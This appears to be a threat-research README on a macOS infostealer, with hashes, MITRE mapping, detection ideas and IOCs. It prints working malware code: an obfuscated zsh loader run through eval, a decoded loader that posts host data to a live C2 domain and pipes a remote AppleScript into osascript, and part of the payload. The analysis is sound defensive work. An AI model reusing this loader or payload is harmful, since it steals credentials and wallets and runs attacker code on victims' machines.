# macOS Infostealer Research Repo

Technical write-up and extracted code for a macOS infostealer that combines credential theft, browser and wallet collection, Telegram session hijacking, wallet application injection, and LaunchAgent-based persistence.

## Malware hashes

|Component|SHA-256|Vendor verdicts|
|-|-|-|
|Payload AppleScript|`e2d8b67a42b61fe666f76d4ae51c3433ec1f20918d1b27863b234a834f5d310a`|19/59 vendors flagged as malicious|
|GoogleUpdate persistence script|`e9cbbddb8475bc47317fbb9a8f935573b1045e49aec66b5d1123786615e67eff`|11/61 vendors flagged as malicious|

## Key findings

* Initial delivery from `hxxps://fastfilenext\[.]com/debug/loader\[.]sh`
* Loader uses `base64 -> gzip -> eval` for fileless execution
* CIS evasion via Russian keyboard layout checks
* Fake macOS password prompt validated with `dscl . authonly`
* Browser theft from Chromium/Gecko families
* Wallet targeting across browser extensions and desktop wallet apps
* Telegram Desktop `tdata` theft for session hijacking
* Keychain and iCloud account data collection
* Wallet application injection by replacing `app.asar`
* Persistence via `\~/Library/LaunchAgents/com.google.keystone.agent.plist`
* Full heartbeat/RCE loop via masqueraded `GoogleUpdate`

## MITRE ATT\&CK mapping

|Technique|ID|Why it fits|
|-|-|-|
|Command and Scripting Interpreter|T1059|zsh, bash, and AppleScript are used for execution|
|Obfuscated Files or Information|T1027|Multi-layer base64 and gzip obfuscation|
|Credentials from Password Stores|T1555|Keychain and browser credential theft|
|Input Capture|T1056|Fake password dialog used to harvest credentials|
|Data from Local System|T1005|Desktop/Documents, browser data, wallets, notes, history|
|Exfiltration Over C2 Channel|T1041|Stolen data and telemetry sent to C2|
|Application Layer Protocol|T1071|HTTPS used for staging, telemetry, and heartbeat|
|Launch Agent|T1543.001|User LaunchAgent used for persistence on macOS|
|Masquerading|T1036|Persistence disguised as Google Keystone/GoogleUpdate|
|System Information Discovery|T1082|Hostname, OS version, locale, IP gathered|
|Account Discovery|T1033|Username harvested|
|Hijack Execution Flow / Modify Existing Component|T1574|Wallet `app.asar` replacement to backdoor apps|

## Repository layout

* `code/01\_decode\_payload.ps1` — PowerShell helper used to decode the gzip/base64 blob
* `code/02\_loader.sh` — original zsh loader
* `code/03\_decoded\_loader.sh` — decoded loader content
* `code/04\_payload.applescript` — AppleScript payload extracted from the analysis notes
* `code/05\_googleupdate\_heartbeat.sh` — decoded persistence/heartbeat script
* `detections/macos\_launchagent\_googleupdate\_sigma.yml` — Sigma concept rule
* `detections/hunting\_queries.kql` — KQL hunting ideas
* `analysis/original\_research\_notes.txt` — original full research notes

## Code excerpts

### PowerShell decoding helper

```powershell
$b64='H4sIAD9mwWkC/71U4U7jRhD+b6nvMLeXXoiE7QRIUbmCytH0SAkJalKK1FbWxh7H22x2fbtrSLi7qg/RJ+yTdNfGEJIKqX/qXzvj/WZn5vtmXr8Kp0yE9zrzXsN3OC1mwCVNUMHff/4FCRqMDZz1x0BFAlMu4zncMZOBQY4LNGrl9ceR/X9MUso1Eo+lFpXSghsNCmkCf4QDNlVUrcIrhSkqFDHqMJaLgOY5x+C8P5GST+UyyDnTBk6dtyfolGPSF3lhxrJQFgJ7J2GCt6EoOIdPMFOYg/+BgSq0ZlS8BZOh8MB+dUZGFTahlHllaWUltgDKEZhIZVmgpoIZdo+QSgU/jEdDbzA6Ox30ov7w+9FxY+d/LIUBucDVVFKVDOhKFgaGdIHE/s/c237XnoyC5q+iCc3dZmX5CTTJ05k07f1PgHEmgRRiLuSdIC3vfDSeDE8ve7agTGojbNyNFNZCbcNH4+i696MF67voFpUGP1cyKWJzbQ0mxfNY2/jezSTqX1l8XCgOvsX7C7r0DbNpdCEzJtdHYUhzFrCcpatAqtlmyBeRLKYio/csDywV/w2ZxlKkbBZsNuSFIqofjcomT73zvoBmy0ntXcF4UorJyitFvoJCMzGDXDFhUk+jSKLETVqEtyjMTgs+lrIttQm968kxaXTImsuFsg9XeGh+JCWOHJEvNdklU/dclFGd1R6WP550FDNdW5X4a6tWQm1LXZJr+aw8n5uuyusJAULW6iWNarzcaW1WnFnLzJ0rzdi+uTIeObiBK3sHSN3/lGqTMo4Cl8aR50QQlr0JqxrBPwdyJoWxhj9Z5XgEbtQs48YmGv6ubbal8BuuSeQ5y2uE7p286XifHTv9tFxn5fBbJsD2Jyr3GiZQvlluOlwy41bZL2v1HkO1UeC3tV2zySaQtYBkKwUHcbGh/bCXhtI8z6favpHCDwVqUyflbb+zeXHrMXjjeQnFhRRRWojYNexRa7jEGL55vP/kO/kX396Gs6JzvjFV++2SrJ80Kv90ZlM8gkt5zzinYTdow84lja1+pc7eQt/yycE6YDSGG+i0o043OmxV+/JnnF4wE3b3D4P9r2Dn4nxyOdgFzuYI7zGeyxacZUouMPy6E7SDg4PDvaDTOYAxTaliDzDygsQqeeV05RpYLW4dK5YbN8tS08qwYtnonVXCt8T29IG+fwBqLQ9wOQcAAA==';$bytes=\[Convert]::FromBase64String($b64);$ms=New-Object IO.MemoryStream(,$bytes);$gz=New-Object IO.Compression.GzipStream($ms,\[IO.Compression.CompressionMode]::Decompress);$sr=New-Object IO.StreamReader($gz);$out=$sr.ReadToEnd();$desktop=\[Environment]::GetFolderPath('Desktop');$outFile=Join-Path $desktop 'Result.txt';\[IO.File]::WriteAllText($outFile,$out);Write-Host '\[+] Decoded to ' $outFile
```

### Original zsh loader

```bash
#!/bin/zsh
d6186d5=$(base64 -D <<'PAYLOAD\_84c66a58' | gunzip
H4sIAD9mwWkC/71U4U7jRhD+b6nvMLeXXoiE7QRIUbmCytH0SAkJalKK1FbWxh7H22x2fbtrSLi7qg/RJ+yTdNfGEJIKqX/qXzvj/WZn5vtmXr8Kp0yE9zrzXsN3OC1mwCVNUMHff/4FCRqMDZz1x0BFAlMu4zncMZOBQY4LNGrl9ceR/X9MUso1Eo+lFpXSghsNCmkCf4QDNlVUrcIrhSkqFDHqMJaLgOY5x+C8P5GST+UyyDnTBk6dtyfolGPSF3lhxrJQFgJ7J2GCt6EoOIdPMFOYg/+BgSq0ZlS8BZOh8MB+dUZGFTahlHllaWUltgDKEZhIZVmgpoIZdo+QSgU/jEdDbzA6Ox30ov7w+9FxY+d/LIUBucDVVFKVDOhKFgaGdIHE/s/c237XnoyC5q+iCc3dZmX5CTTJ05k07f1PgHEmgRRiLuSdIC3vfDSeDE8ve7agTGojbNyNFNZCbcNH4+i696MF67voFpUGP1cyKWJzbQ0mxfNY2/jezSTqX1l8XCgOvsX7C7r0DbNpdCEzJtdHYUhzFrCcpatAqtlmyBeRLKYio/csDywV/w2ZxlKkbBZsNuSFIqofjcomT73zvoBmy0ntXcF4UorJyitFvoJCMzGDXDFhUk+jSKLETVqEtyjMTgs+lrIttQm968kxaXTImsuFsg9XeGh+JCWOHJEvNdklU/dclFGd1R6WP550FDNdW5X4a6tWQm1LXZJr+aw8n5uuyusJAULW6iWNarzcaW1WnFnLzJ0rzdi+uTIeObiBK3sHSN3/lGqTMo4Cl8aR50QQlr0JqxrBPwdyJoWxhj9Z5XgEbtQs48YmGv6ubbal8BuuSeQ5y2uE7p286XifHTv9tFxn5fBbJsD2Jyr3GiZQvlluOlwy41bZL2v1HkO1UeC3tV2zySaQtYBkKwUHcbGh/bCXhtI8z6favpHCDwVqUyflbb+zeXHrMXjjeQnFhRRRWojYNexRa7jEGL55vP/kO/kX396Gs6JzvjFV++2SrJ80Kv90ZlM8gkt5zzinYTdow84lja1+pc7eQt/yycE6YDSGG+i0o043OmxV+/JnnF4wE3b3D4P9r2Dn4nxyOdgFzuYI7zGeyxacZUouMPy6E7SDg4PDvaDTOYAxTaliDzDygsQqeeV05RpYLW4dK5YbN8tS08qwYtnonVXCt8T29IG+fwBqLQ9wOQcAAA==
PAYLOAD\_84c66a58
)
eval "$d6186d5"
```

### Decoded loader

```bash
#!/bin/zsh # Debug loader — detect CIS and block with telemetry IS\_CIS="false" if defaults read \~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -qi russian; then IS\_CIS="true" fi # Detect locale info — sanitize for JSON LOCALE\_INFO=$(defaults read \~/Library/Preferences/com.apple.HIToolbox.plist AppleEnabledInputSources 2>/dev/null | grep -i "KeyboardLayout Name" | head -5 | tr '\\n' ',' | tr -d '"' | tr -d "'" || echo "unknown") HOSTNAME=$(hostname 2>/dev/null | tr -d '"' || echo "unknown") OS\_VER=$(sw\_vers -productVersion 2>/dev/null || echo "unknown") EXT\_IP=$(curl -s --max-time 5 https://api.ipify.org 2>/dev/null || curl -s --max-time 5 https://icanhazip.com 2>/dev/null || curl -s --max-time 5 https://ifconfig.me 2>/dev/null || echo "unknown") EXT\_IP=$(echo "$EXT\_IP" | tr -d ' ') # Build JSON safely using printf send\_debug\_event() { local EVT="$1" local JSON=$(printf '{"event":"%s","build\_hash":"%s","ip":"%s","is\_cis":"%s","locale":"%s","hostname":"%s","os\_version":"%s"}' "$EVT" "" "$EXT\_IP" "$IS\_CIS" "$LOCALE\_INFO" "$HOSTNAME" "$OS\_VER") curl -s -X POST "https://fastfilenext.com/api/debug/event" -H "Content-Type: application/json" -d "$JSON" --max-time 5 >/dev/null 2>\&1 } # If CIS — send cis\_blocked event and exit if \[ "$IS\_CIS" = "true" ]; then send\_debug\_event "cis\_blocked" >/dev/null 2>\&1 exit 0 fi # Not CIS — send loader\_requested event send\_debug\_event "loader\_requested" >/dev/null 2>\&1 \& daemon\_function() { exec </dev/null exec >/dev/null exec 2>/dev/null curl -k -s --max-time 30 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" "https://fastfilenext.com/debug/payload.applescript" | osascript } daemon\_function "$@" \& exit 0

```

### Payload.applescript

```applescript
try
do shell script "killall Terminal"
end try

property writemind : ""

on filesizer(paths)
set fsz to 0
try
set theItem to quoted form of POSIX path of paths
set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " \& theItem)
end try
return fsz
end filesizer

on mkdir(someItem)
try
set filePosixPath to quoted form of (POSIX path of someItem)
do shell script "mkdir -p " \& filePosixPath
end try
end mkdir

on FileName(filePath)
try
set reversedPath to (reverse of every character of filePath) as string
set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
set finalPath to (reverse of every character of trimmedPath) as string
return finalPath
end try
end FileName

on BeforeFileName(filePath)
try
set lastSlash to offset of "/" in (reverse of every character of filePath) as string
set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
return trimmedPath
end try
end BeforeFileName

on writeText(textToWrite, filePath)
try
set folderPath to BeforeFileName(filePath)
mkdir(folderPath)
set fileRef to (open for access filePath with write permission)
write textToWrite to fileRef starting at eof
close access fileRef
end try
end writeText

on debugLog(msg)
try
set ts to do shell script "date '+%H:%M:%S'"
writeText(ts \& " | " \& msg \& return, writemind \& "debug")
end try
end debugLog

on readwrite(path\_to\_file, path\_as\_save)
try
set fileContent to read path\_to\_file
set folderPath to BeforeFileName(path\_as\_save)
mkdir(folderPath)
do shell script "cat " \& quoted form of path\_to\_file \& " > " \& quoted form of path\_as\_save
debugLog("COPY OK: " \& path\_to\_file \& " -> " \& path\_as\_save)
on error errMsg
debugLog("COPY FAIL: " \& path\_to\_file \& " | " \& errMsg)
end try
end readwrite

on isDirectory(someItem)
try
set filePosixPath to quoted form of (POSIX path of someItem)
set fileType to (do shell script "file -b " \& filePosixPath)
if fileType ends with "directory" then
return true
end if
return false
end try
end isDirectory

on GrabFolderLimit(sourceFolder, destinationFolder)
try
debugLog("GrabFolderLimit: " \& sourceFolder \& " -> " \& destinationFolder)
set bankSize to 0
set exceptionsList to {".DS\_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
set fileList to list folder sourceFolder without invisibles
mkdir(destinationFolder)
repeat with currentItem in fileList
if currentItem is not in exceptionsList then
set itemPath to sourceFolder \& "/" \& currentItem
set savePath to destinationFolder \& "/" \& currentItem
if isDirectory(itemPath) then
GrabFolderLimit(itemPath, savePath)
else
set fsz to filesizer(itemPath)
set bankSize to bankSize + fsz
if bankSize < 100 \* 1024 \* 1024 then
readwrite(itemPath, savePath)
end if
end if
end if
end repeat
on error errMsg
debugLog("GrabFolderLimit FAIL: " \& sourceFolder \& " | " \& errMsg)
end try
end GrabFolderLimit

on GrabFolder(sourceFolder, destinationFolder)
try
debugLog("GrabFolder: " \& sourceFolder \& " -> " \& destinationFolder)
set exceptionsList to {".DS\_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews", "dumps", "emoji", "user\_data", "\_\_update\_\_"}
set fileList to list folder sourceFolder without invisibles
mkdir(destinationFolder)
repeat with currentItem in fileList
if currentItem is not in exceptionsList then
set itemPath to sourceFolder \& "/" \& currentItem
set savePath to destinationFolder \& "/" \& currentItem
if isDirectory(itemPath) then
GrabFolder(itemPath, savePath)
else
readwrite(itemPath, savePath)
end if
end if
end repeat
end try
end GrabFolder

on checkvalid(username, password\_entered)
try
set result to do shell script "dscl . authonly " \& quoted form of username \& space \& quoted form of password\_entered
if result is not equal to "" then
return false
else
return true
end if
on error
return false
end try
end checkvalid
Full code is attached in repo
```

## Detection opportunities

* Creation of `\~/Library/LaunchAgents/com.google.keystone.agent.plist`
* Creation of `\~/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate`
* Process chains involving `curl | osascript`
* Use of `launchctl load` from user-writable paths
* Network traffic to `fastfilenext.com`, `api.ipify.org`, `icanhazip.com`, `ifconfig.me`
* Access to cryptocurrency wallet directories and browser extension storage
* Abrupt wallet process termination followed by `app.asar` replacement and `codesign -f -s -`

## IOC summary

### Infrastructure

* `hxxps://fastfilenext\[.]com`
* `/debug/loader.sh`
* `/debug/payload.applescript`
* `/gate`
* `/gate/chunk`
* `/api/debug/event`
* `/api/bot/heartbeat`
* `/gate/exodus-asar`
* `/gate/atomic-asar`
* `/gate/ledger-asar`
* `/gate/ledgerlive-asar`
* `/gate/trezor-asar`

### Additional identifiers

* API key: `61cb9c3bd1a2faa7d6613dd8e5d09e79fe95e85ab09ed6bcd6406badff5a083f`
* Build ID: `d91d844ad8920458ee99e707b1a203cba8df76ce960195f0993eb3b0e96d893f`

## Notes

This analysis has been done with tools such as AnyRun and Powershell

